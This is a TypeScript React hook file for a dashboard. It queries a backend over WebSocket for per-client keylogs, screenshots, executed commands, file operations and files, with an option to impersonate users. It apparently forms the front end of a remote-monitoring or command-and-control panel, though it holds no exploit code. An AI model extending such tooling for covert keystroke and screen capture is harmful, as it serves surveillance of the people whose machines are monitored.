import { useState, useCallback, useEffect, useRef } from 'react';
import { useBridgeWebSocket } from './BridgeWebSocketProvider';
import { useDashboardStore } from '../store/dashboardStore.ts';

export type DatabaseQueryType = 
  | 'get_clients'
  | 'get_client'
  | 'get_screenshots'
  | 'get_keylogs'
  | 'get_keylog_status'
  | 'get_commands'
  | 'get_file_operations'
  | 'get_statistics'
  | 'get_screenshot'
  | 'get_file'
  | 'delete_screenshot';

export interface DatabaseQueryParams {
  query: DatabaseQueryType;
  clientId?: string;
  screenshotId?: number;
  fileId?: number;
  limit?: number;
  offset?: number;
  impersonateUserId?: string;
  [key: string]: any;
}

export interface DatabaseResponse<T = any> {
  type: 'db_response';
  query: DatabaseQueryType;
  data: T;
  timestamp: number;
}

export interface DatabaseError {
  type: 'error';
  message: string;
  timestamp: number;
  queryId?: string;
}

function isDatabaseResponse<T>(payload: unknown): payload is DatabaseResponse<T> & { queryId?: string } {
  if (!payload || typeof payload !== 'object') return false;

  const candidate = payload as Record<string, unknown>;
  return candidate.type === 'db_response' && typeof candidate.query === 'string' && 'data' in candidate;
}

function isDatabaseError(payload: unknown): payload is DatabaseError {
  if (!payload || typeof payload !== 'object') return false;

  const candidate = payload as Record<string, unknown>;
  return candidate.type === 'error' && typeof candidate.message === 'string';
}

export interface UseDatabaseQueryOptions {
  autoConnect?: boolean;
  onError?: (error: string) => void;
  onSuccess?: (data: any, query: DatabaseQueryType) => void;
}

export interface UseDatabaseQueryReturn<T = any> {
  // Query state
  isLoading: boolean;
  isError: boolean;
  error: string | null;
  data: T | null;
  
  // Query methods
  executeQuery: (params: DatabaseQueryParams) => Promise<T>;
  refetch: () => Promise<T>;
  
  // Query info
  lastQuery: DatabaseQueryParams | null;
  lastResponseTime: number | null;
  queryCount: number;
}

interface PendingQuery<T = any> {
  resolve: (value: T) => void;
  reject: (reason: unknown) => void;
  timeoutId: ReturnType<typeof setTimeout>;
  query: DatabaseQueryType;
}

function getQueryKey(query?: DatabaseQueryParams): string {
  if (!query) return '';

  const sortedEntries = Object.entries(query).sort(([left], [right]) => left.localeCompare(right));
  return JSON.stringify(sortedEntries);
}

export function useDatabaseQuery<T = any>(
  initialQuery?: DatabaseQueryParams,
  options: UseDatabaseQueryOptions = {}
): UseDatabaseQueryReturn<T> {
  const {
    autoConnect = true,
    onError,
    onSuccess
  } = options;

  // State
  const [isLoading, setIsLoading] = useState(false);
  const [isError, setIsError] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [data, setData] = useState<T | null>(null);
  const [lastQuery, setLastQuery] = useState<DatabaseQueryParams | null>(initialQuery || null);
  const [lastResponseTime, setLastResponseTime] = useState<number | null>(null);
  const [queryCount, setQueryCount] = useState(0);
  const initialQueryKey = getQueryKey(initialQuery);
  const lastAutoExecutedQueryKeyRef = useRef<string>('');
  const activeQueryTypeRef = useRef<DatabaseQueryType | undefined>(initialQuery?.query);

  // Refs for tracking promises
  const pendingQueries = useRef<Map<string, PendingQuery<T>>>(new Map());

  // Shared bridge WebSocket connection (single app-wide socket)
  const { send, isConnected, subscribe } = useBridgeWebSocket();
  const { impersonateUserId } = useDashboardStore();

  // Generate unique query ID
  const generateQueryId = useCallback(() => {
    return `query_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  }, []);

  // Handle database responses
  useEffect(() => {
    const resolvePendingQuery = (queryId: string | undefined, query: DatabaseQueryType, payload: T): boolean => {
      if (queryId && pendingQueries.current.has(queryId)) {
        const pending = pendingQueries.current.get(queryId)!;
        clearTimeout(pending.timeoutId);
        pendingQueries.current.delete(queryId);
        pending.resolve(payload);
        return true;
      }

      for (const [pendingId, pending] of pendingQueries.current.entries()) {
        if (pending.query === query) {
          clearTimeout(pending.timeoutId);
          pendingQueries.current.delete(pendingId);
          pending.resolve(payload);
          return true;
        }
      }

      return false;
    };

    const rejectPendingQuery = (queryId: string | undefined, message: string): boolean => {
      if (queryId && pendingQueries.current.has(queryId)) {
        const pending = pendingQueries.current.get(queryId)!;
        clearTimeout(pending.timeoutId);
        pendingQueries.current.delete(queryId);
        pending.reject(new Error(message));
        return true;
      }

      const firstPending = pendingQueries.current.entries().next();
      if (!firstPending.done) {
        const [pendingId, pending] = firstPending.value;
        clearTimeout(pending.timeoutId);
        pendingQueries.current.delete(pendingId);
        pending.reject(new Error(message));
        return true;
      }

      return false;
    };

    const handleDatabaseResponse = (response: unknown, _rawEvent?: MessageEvent) => {
      try {
        if (!isDatabaseResponse<T>(response)) {
          return;
        }

        const dbResponse = response;
        // Extract query ID from response if available
        const queryId = dbResponse.queryId;
        
        const wasPendingQuery = resolvePendingQuery(queryId, dbResponse.query, dbResponse.data);
        const isActiveQueryResponse = activeQueryTypeRef.current === dbResponse.query;

        if (!wasPendingQuery && !isActiveQueryResponse) {
          return;
        }

        setData(dbResponse.data);
        setIsLoading(false);
        setIsError(false);
        setError(null);
        setLastResponseTime(Date.now());
        setQueryCount(prev => prev + 1);
        
        if (onSuccess) {
          onSuccess(dbResponse.data, dbResponse.query);
        }
      } catch (err) {
        console.error('Error handling database response:', err);
      }
    };

    const handleDatabaseError = (errorResponse: unknown, _rawEvent?: MessageEvent) => {
      try {
        if (!isDatabaseError(errorResponse)) {
          return;
        }

        const dbError = errorResponse;
        // Extract query ID from error if available
        const queryId = dbError.queryId;
        
        const wasPendingQuery = rejectPendingQuery(queryId, dbError.message);
        if (!wasPendingQuery) {
          return;
        }

        setIsLoading(false);
        setIsError(true);
        setError(dbError.message);
        
        if (onError) {
          onError(dbError.message);
        }
      } catch (err) {
        console.error('Error handling database error:', err);
      }
    };

    // Subscribe to database responses
    const unsubscribeResponse = subscribe('db_response', handleDatabaseResponse);
    const unsubscribeError = subscribe('error', handleDatabaseError);

    return () => {
      unsubscribeResponse();
      unsubscribeError();
    };
  }, [subscribe, onError, onSuccess]);

  // Execute a database query
  const executeQuery = useCallback(async (params: DatabaseQueryParams): Promise<T> => {
    if (!isConnected) {
      const errorMsg = 'WebSocket not connected';
      setIsError(true);
      setError(errorMsg);
      throw new Error(errorMsg);
    }

    setIsLoading(true);
    setIsError(false);
    setError(null);
    setLastQuery(params);
    activeQueryTypeRef.current = params.query;

    return new Promise<T>((resolve, reject) => {
      const queryId = generateQueryId();
      
      // Send query with timeout
      const timeoutId = setTimeout(() => {
        if (pendingQueries.current.has(queryId)) {
          pendingQueries.current.delete(queryId);
          setIsLoading(false);
          setIsError(true);
          setError('Query timeout');
          reject(new Error('Query timeout'));
        }
      }, 30000); // 30 second timeout

      // Store promise callbacks
      pendingQueries.current.set(queryId, {
        resolve,
        reject,
        timeoutId,
        query: params.query,
      });

      try {
        // Send query to WebSocket
        // Bridge server expects messages with 'type' field, not 'topic'
        const message = {
          type: 'db_query',
          ...params,
          impersonateUserId: params.impersonateUserId ?? impersonateUserId ?? undefined,
          queryId
        };

        const sent = send(message);
        
        if (!sent) {
          clearTimeout(timeoutId);
          pendingQueries.current.delete(queryId);
          setIsLoading(false);
          setIsError(true);
          setError('Failed to send query');
          reject(new Error('Failed to send query'));
        }
      } catch (err) {
        clearTimeout(timeoutId);
        pendingQueries.current.delete(queryId);
        setIsLoading(false);
        setIsError(true);
        setError(err instanceof Error ? err.message : 'Unknown error');
        reject(err);
      }
    });
  }, [isConnected, send, generateQueryId]);

  // Refetch last query
  const refetch = useCallback(async (): Promise<T> => {
    if (!lastQuery) {
      throw new Error('No previous query to refetch');
    }
    return executeQuery(lastQuery);
  }, [lastQuery, executeQuery]);

  // Reset auto-executed marker when socket disconnects so reconnect can re-fetch.
  useEffect(() => {
    if (!isConnected) {
      lastAutoExecutedQueryKeyRef.current = '';
    }
  }, [isConnected]);

  // Execute initial query once per query shape when connected.
  useEffect(() => {
    if (!initialQuery || !autoConnect || !isConnected) {
      return;
    }

    if (lastAutoExecutedQueryKeyRef.current === initialQueryKey) {
      return;
    }

    lastAutoExecutedQueryKeyRef.current = initialQueryKey;

    if (initialQuery && autoConnect && isConnected) {
      executeQuery(initialQuery).catch(() => {
        // Error handled by executeQuery
      });
    }
  }, [initialQuery, initialQueryKey, autoConnect, isConnected, executeQuery]);

  useEffect(() => {
    return () => {
      pendingQueries.current.forEach((pending) => {
        clearTimeout(pending.timeoutId);
      });
      pendingQueries.current.clear();
    };
  }, []);

  return {
    isLoading,
    isError,
    error,
    data,
    executeQuery,
    refetch,
    lastQuery,
    lastResponseTime,
    queryCount
  };
}

// Specialized hooks for common queries

export function useClientsQuery(limit: number = 100, offset: number = 0) {
  return useDatabaseQuery({
    query: 'get_clients',
    limit,
    offset
  });
}

export function useClientQuery(clientId: string) {
  return useDatabaseQuery({
    query: 'get_client',
    clientId
  });
}

export function useScreenshotsQuery(clientId: string, limit: number = 50, offset: number = 0) {
  return useDatabaseQuery({
    query: 'get_screenshots',
    clientId,
    limit,
    offset
  });
}

export function useKeylogsQuery(clientId: string, limit: number = 100, offset: number = 0) {
  return useDatabaseQuery({
    query: 'get_keylogs',
    clientId,
    limit,
    offset
  });
}

export function useCommandsQuery(clientId: string, limit: number = 100, offset: number = 0) {
  return useDatabaseQuery({
    query: 'get_commands',
    clientId,
    limit,
    offset
  });
}

export function useFileOperationsQuery(clientId: string, limit: number = 100, offset: number = 0) {
  return useDatabaseQuery({
    query: 'get_file_operations',
    clientId,
    limit,
    offset
  });
}

export function useStatisticsQuery() {
  return useDatabaseQuery({
    query: 'get_statistics'
  });
}

export function useScreenshotQuery(screenshotId: number) {
  return useDatabaseQuery({
    query: 'get_screenshot',
    screenshotId
  });
}

export function useFileQuery(fileId: number) {
  return useDatabaseQuery({
    query: 'get_file',
    fileId
  });
}